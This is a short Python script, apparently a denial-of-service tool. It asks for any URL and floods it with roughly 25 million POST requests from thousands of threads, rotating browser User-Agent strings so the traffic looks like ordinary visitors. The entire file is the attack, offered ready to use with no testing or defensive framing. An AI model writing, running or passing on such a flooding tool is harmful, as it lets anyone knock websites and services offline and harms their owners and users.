import requests
import random
import threading
from multiprocessing.pool import ThreadPool

def make_request(url):
    headers = {
        'User-Agent': random.choice(user_agents),
        'Accept-Language': 'en-US,en;q=0.5',
        'Connection': 'keep-alive',
        'Content-Type': 'application/json'
    }
    data = {
        'key1': 'value1',
        'key2': 'value2'
    }
    response = requests.post(url, headers=headers, data=data)
    print(response.text)

def run_threads(url):
    threads = []
    for i in range(5000):
        t = threading.Thread(target=make_request, args=(url,))
        threads.append(t)
        t.start()
    for t in threads:
        t.join()

if __name__ == '__main__':
    url = input("Enter the URL: ")
    user_agents = [
        'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36',
        'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:54.0) Gecko/20100101 Firefox/54.0',
        'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.63 Safari/537.36',
        'Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; AS; rv:11.0) like Gecko',
        'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36 Edge/16.16299'
    ]
    pool = ThreadPool(processes=5000)
    for i in range(5000):
        pool.apply_async(run_threads, args=(url,))
    pool.close()
    pool.join()
